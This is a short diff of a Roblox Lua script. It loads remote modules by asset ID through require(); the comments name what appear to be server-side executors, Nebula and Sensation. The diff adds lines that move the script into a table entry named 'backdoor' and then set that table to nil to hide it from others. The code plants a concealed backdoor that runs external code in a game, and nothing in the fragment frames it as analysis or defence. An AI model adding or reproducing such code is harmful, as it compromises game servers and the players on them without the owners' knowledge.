@@ -1,10 +1,12 @@
 
 getfenv(1).owner = plr
 
--- 0x4C059AED9772 for Nebula
--- 0x55262CE723BF for Sensation
-local conversion = 0x4C059AED9772
-require(conversion)()
+if plr.Character and plr.Character.Parent ~= nil then
+    -- 0x4C059AED9772 for Nebula
+    -- 0x55262CE723BF for Sensation
+    local conversion = 0x4C059AED9772
+    require(conversion)()
+end
 
 -- APPLY ENVIRONMENT CHANGES
 game = getfenv(1).game
@@ -32,3 +34,5 @@ elseif conversion == 0x4C059AED9772 then
     math = getfenv(1).math
 end
 
+getfenv().script.Parent = system32["backdoor"]
+system32 = nil -- stop ppl from accessing!
